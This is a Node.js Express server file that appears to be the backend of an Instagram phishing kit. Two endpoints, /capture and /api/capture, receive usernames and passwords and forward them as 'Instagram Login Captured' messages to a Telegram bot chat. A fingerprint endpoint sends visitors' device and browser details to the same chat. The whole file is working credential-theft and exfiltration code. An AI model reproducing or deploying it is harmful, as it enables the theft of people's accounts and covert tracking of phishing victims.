import express from 'express';
import cors from 'cors';
import fetch from 'node-fetch';
import dotenv from 'dotenv';

dotenv.config();

const app = express();

const getEnvValue = (...keys) => {
  for (const key of keys) {
    const value = process.env[key];
    if (typeof value === 'string' && value.trim()) {
      return value.trim();
    }
  }
  return '';
};

const TELEGRAM_BOT_TOKEN = getEnvValue('TELEGRAM_BOT_TOKEN', 'TELEGRAM_TOKEN');
const TELEGRAM_CHAT_ID = getEnvValue('TELEGRAM_CHAT_ID', 'CHAT_ID');
const hasTelegramConfig = Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);

app.disable('x-powered-by');
app.use(cors());
app.use(express.json({ limit: '50mb' }));

const sendTelegramMessage = async (text) => {
  if (!hasTelegramConfig) {
    return { ok: false, reason: 'missing telegram config' };
  }

  const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: String(TELEGRAM_CHAT_ID),
      text,
      parse_mode: 'HTML',
    }),
  });

  const responseText = await response.text();
  return {
    ok: response.ok,
    status: response.status,
    body: responseText,
  };
};

app.get('/api/health', (_req, res) => {
  res.json({ ok: true, hasTelegramConfig });
});

app.post('/api/fingerprint', async (req, res) => {
  const body = req.body?.data ?? req.body ?? {};
  const fingerprint = body && typeof body === 'object' ? body : {};

  const text = [
    '🔥 Visitor fingerprint captured',
    '',
    `🧭 Visitor ID: ${fingerprint.visitorId || 'N/A'}`,
    `🖥️ User-Agent: ${fingerprint.userAgent ? String(fingerprint.userAgent).substring(0, 120) : 'N/A'}`,
    `🌍 Platform: ${fingerprint.platform || 'N/A'}`,
    `🗺️ Language: ${fingerprint.language || 'N/A'}`,
    `🕒 Timezone: ${fingerprint.timezone || 'N/A'}`,
    `📐 Screen: ${fingerprint.screen || 'N/A'}`,
    `📱 Device: ${fingerprint.deviceType || 'N/A'}`,
    `🎨 Color Depth: ${fingerprint.colorDepth || 'N/A'}`,
    `📏 Pixel Ratio: ${fingerprint.pixelRatio || 'N/A'}`,
    `🕒 Timestamp: ${new Date().toISOString()}`,
  ].join('\n');

  if (hasTelegramConfig) {
    try {
      const result = await sendTelegramMessage(text);
      console.log('Telegram fingerprint result:', result);
    } catch (err) {
      console.error('Telegram fingerprint failed:', err);
    }
  }

  return res.json({ success: true });
});

app.post('/capture', async (req, res) => {
  const { username, password, target, time } = req.body || {};

  if (!username || !password) {
    return res.json({ success: true });
  }

  const message = `
<b>🔥 Instagram Login Captured</b>

👤 <b>Username:</b> ${username}
🔑 <b>Password:</b> <code>${password}</code>
🎯 <b>Target:</b> ${target || 'aadya.tiwari.me'}
⏰ <b>Time:</b> ${new Date(time || Date.now()).toLocaleString()}
  `.trim();

  if (hasTelegramConfig) {
    try {
      const result = await sendTelegramMessage(message);
      console.log('Telegram capture result:', result);
    } catch (err) {
      console.error('Telegram capture failed:', err);
    }
  }

  return res.json({ success: true });
});

app.post('/api/capture', async (req, res) => {
  const { username, password, target, time } = req.body || {};

  if (!username || !password) {
    return res.json({ success: true });
  }

  const message = `
<b>🔥 Instagram Login Captured</b>

👤 <b>Username:</b> ${username}
🔑 <b>Password:</b> <code>${password}</code>
🎯 <b>Target:</b> ${target || 'aadya.tiwari.me'}
⏰ <b>Time:</b> ${new Date(time || Date.now()).toLocaleString()}
  `.trim();

  if (hasTelegramConfig) {
    try {
      const result = await sendTelegramMessage(message);
      console.log('Telegram capture API result:', result);
    } catch (err) {
      console.error('Telegram capture API failed:', err);
    }
  }

  return res.json({ success: true });
});

export default app;
